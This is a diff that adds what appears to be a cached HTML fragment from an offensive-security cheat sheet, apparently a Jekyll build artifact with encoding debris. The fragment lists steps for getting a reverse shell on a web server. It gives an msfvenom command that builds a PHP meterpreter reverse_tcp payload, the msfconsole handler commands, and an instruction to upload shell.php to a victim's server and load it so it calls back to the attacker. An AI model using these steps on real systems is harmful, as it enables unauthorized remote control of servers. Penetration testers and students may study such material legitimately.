@@ -1,0 +1,22 @@
+I"¿<blockquote>
+  <p><strong>Requirements</strong>: Write access to webserver.</p>
+</blockquote>
+
+<ol>
+  <li>Generate malicious PHP file:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;<span class="nv">$LOCAL_IP</span><span class="o">&gt;</span> <span class="nv">LPORT</span><span class="o">=</span>&lt;<span class="nv">$LOCAL_PORT</span><span class="o">&gt;</span> <span class="nt">-f</span> raw <span class="nt">-o</span> shell.php
+</code></pre></div>    </div>
+  </li>
+  <li>Run <code class="highlighter-rouge">msfconsole</code> to start the listener:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler 
+set LHOST &lt;$LOCAL_IP&gt;
+set LPORT &lt;$LOCAL_PORT&gt;
+set PAYLOAD php/meterpreter/reverse_tcp 
+exploit
+</code></pre></div>    </div>
+  </li>
+  <li>Upload <code class="highlighter-rouge">shell.php</code> to the victimâ€™s server and then query it in a browser. This will connect back to the local Metasploit listener and open up a shell on the server.</li>
+</ol>
+
+<hr />
+:ET
